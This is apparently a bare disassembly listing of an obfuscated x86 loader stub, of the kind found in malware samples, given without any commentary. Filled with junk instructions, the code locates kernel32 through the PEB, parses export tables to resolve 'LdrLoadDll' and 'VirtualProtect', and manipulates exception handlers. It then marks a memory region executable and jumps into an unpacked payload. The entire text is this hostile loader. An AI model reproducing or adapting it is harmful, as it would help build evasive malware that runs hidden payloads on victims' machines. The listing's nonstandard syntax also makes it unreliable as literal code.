_start
pushad
call $+5
mov [ esp ] edi
xor edi [ esp ]
or eax eax
sbb esp 0xfffffffc
push esp
and edi edi
sbb edi 0xffffffff
pop ecx
test ecx ecx
adc edi 0x1
sub ecx 0x4
add edi 0x1
neg edi
call $+5
sub [ ecx ] edi
retn
sub_6f002039
sub esp 0x4
mov [ esp ] ebx
xor ebx [ esp ]
or eax eax
adc esp 0x4
and eax 0x0
or eax ebx
stc
sbb ah 0x0
sub ah 0x1
mov al ah
xor ebp ebp
or ebp ebx
call $+5
or edi edi
mov esi 0x0
adc esi [ esp ]
and edx edx
adc ebp 0x1
movzx edx [ esi + ebp - 0x2 ]
call $+5
mov [ esp ] edx
xor edx eax
pop edx
jne r-xdata
add [ esp ] ebx
jmp [ esp ]
mov ebx 0x0
sub ebx ebp
neg ebx
sub_6f0020bb
push [ fs : 0x0 ]
and esi esi
adc ebx ecx
mov eax 0x0
sub eax 0xffff
neg eax
not edx
test edx edx
adc ebx ecx
mov [ fs : 0x0 ] esp
and ebx edx
add ebx ecx
test eax eax
jno r-xdata
call $+5
or eax eax
sbb ebx ecx
add esp 0xfffffffc
mov [ esp ] edi
xor edi [ esp ]
test edi edi
adc esp 0x4
mov edi [ ebx ]
and esi 0x0
or esi 0x5a4d
and edi eax
call $+5
mov [ esp ] edi
xor edi esi
pop edi
je r-xdata
call sub_6f0020bb
call $+5
mov [ esp ] edx
mov edx 0x0
xor edx [ esp + 0x10 ]
test eax eax
sbb [ edx + 0xb8 ] 0xffffffff
or eax eax
sbb [ edx + 0xb8 ] 0xffffffff
pop edx
call $+5
mov [ esp ] eax
xor eax [ esp ]
test ebx ebx
sbb esp 0xfffffffc
retn 0x10
pop edi
mov edi 0x0
add edi [ esp ]
mov [ fs : 0x0 ] edi
and edi edi
adc esp 0x8
mov ecx 0x0
sub ecx ebx
neg ecx
xor edi edi
add edi [ ebx + 0x3c ]
add ebx edi
mov edi 0x0
xor edi 0x4550
and esi 0x0
add esi [ ebx ]
add esp 0xfffffffc
mov [ esp ] edi
sub edi esi
pop edi
jne r-xdata
jmp [ esp ]
popad
xor eax eax
or eax 0x1
retn 0xc
and edi 0x0
or edi [ ebx + 0x78 ]
push edi
pop ebx
add ebx ecx
sub esp 0x4
mov [ esp ] ebx
and edi 0x0
add edi [ ebx + 0x20 ]
mov ebx edi
and ecx ecx
adc ebx ecx
add esp 0xfffffffc
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] ebx
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
sub esp 0xfffffffc
xor eax eax
or eax esi
mov ecx 0x0
sub ecx [ esi ]
neg ecx
sub esi esi
add esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
and esi esi
adc esi ebx
call $+5
mov [ esp ] 0x6c6c
call $+5
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
mov edi 0x0
xor edi esp
xor ecx ecx
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub esp esp
add esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
mov edx [ esp ]
add esp 0x4
mov ecx [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
xor eax eax
add eax ebx
xor edi edi
or edi [ ebx + 0x24 ]
mov ebx 0x0
or ebx edi
add ebx ecx
xor edi edi
xor edi [ ebx + edx * 2 ]
and edi 0xffff
and edx 0x0
add edx edi
mov edi 0x0
xor edi [ eax + 0x10 ]
test eax eax
sbb edx edi
test eax eax
adc edx 0x1
and eax eax
mov ebx 0x0
adc ebx [ eax + 0x1c ]
add ebx ecx
xor edi edi
or edi [ ebx + edx * 4 ]
test edx edx
adc ecx edi
mov ebp 0x0
add ebp esp
sub esp 0x4
mov [ esp ] edi
xor edi [ esp ]
sub esp 0xfffffffc
push edi
and ebx 0x0
or ebx esp
sub esp 0x4
mov [ esp ] edi
sub esp 0x4
mov [ esp ] 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
call $+5
mov [ esp ] 0x320033
call $+5
mov [ esp ] 0x6c0065
add esp 0xfffffffc
mov [ esp ] 0x6e0072
sub esp 0x4
mov [ esp ] 0x65006b
push esp
sub esp 0x4
mov [ esp ] 0x1a0018
push esp
pop esi
push ebx
call $+5
mov [ esp ] esi
push edi
add esp 0xfffffffc
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] ecx
call $+5
mov [ esp ] ebx
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
mov eax 0x0
xor eax [ esi ]
call $+5
mov [ esp ] eax
pop edi
and esi 0x0
or esi [ fs : 0x30 ]
mov ecx 0x0
xor ecx [ esi + 0x10 ]
mov [ ecx + 0x18 ] edi
mov esp 0x0
add esp ebp
mov esi 0x0
sub esi [ fs : 0x30 ]
neg esi
test ecx ecx
mov ecx 0x0
adc ecx [ esi + 0x10 ]
and ebx 0x0
add ebx [ ecx + 0x18 ]
mov ecx 0x0
xor ecx ebx
mov edi 0x0
xor edi [ ebx + 0x3c ]
add ebx edi
push [ ebx + 0x78 ]
pop edi
mov ebx 0x0
or ebx edi
and ebx ebx
adc ebx ecx
sub esp 0x4
mov [ esp ] ebx
mov edi 0x0
sub edi [ ebx + 0x20 ]
neg edi
mov ebx 0x0
add ebx edi
or edi edi
adc ebx ecx
sub esp 0x4
mov [ esp ] ecx
push ebx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
xor edx edx
sub eax eax
add eax esi
push [ esi ]
pop ecx
mov esi 0x0
sub esi ecx
neg esi
call $+5
sub ebp ebp
add ebp esp
test edx edx
adc esi ebx
push 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
sub esp 0x4
mov [ esp ] 0x74726956
and edi 0x0
add edi esp
mov ecx 0x0
add ecx 0xf
[ esi ] [ edi ]
je r-xdata
and edx edx
adc edx 0x1
and ecx ecx
adc eax 0x4
and esi 0x0
or esi [ eax ]
mov esp 0x0
or esp ebp
jmp [ esp ]
mov esp 0x0
xor esp ebp
mov esi [ esp ]
add esp 0x4
call $+5
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
pop edx
pop ecx
add esp 0x4
mov ebx [ esp - 0x4 ]
mov eax 0x0
add eax ebx
mov edi 0x0
sub edi [ ebx + 0x24 ]
neg edi
xor ebx ebx
add ebx edi
add ebx ecx
and edi 0x0
or edi [ ebx + edx * 2 ]
and edi 0xffff
mov edx edi
mov edi 0x0
sub edi [ eax + 0x10 ]
neg edi
and edx edx
sbb edx edi
or ebx ebx
sbb edx 0xffffffff
push [ eax + 0x1c ]
pop ebx
and eax eax
adc ebx ecx
mov edi 0x0
sub edi [ ebx + edx * 4 ]
neg edi
add ecx edi
mov eax 0x0
add eax 0x1000
call $+5
pop ebx
and ebx 0xfffff000
add ebx eax
test ecx ecx
adc ebx eax
add esp 0xfffffffc
mov [ esp ] ebx
and esi 0x0
or esi 0x4
call $+5
add ebx eax
mov edi [ ebx ]
stc
sbb esi 0x0
je r-xdata
and edi edi
adc edx 0x1
add eax 0x4
sub esi esi
add esi [ eax ]
mov esp ebp
jmp [ esp ]
add esp 0x4
mov edi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] edi
push esp
sub esp 0x4
mov [ esp ] 0x40
push 0x45b6
call $+5
mov [ esp ] ebx
call $+5
mov [ esp ] ecx
push ebx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
add eax 0x14
add esp 0xfffffffc
mov [ esp ] eax
push ebp
xor ebp ebp
xor ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
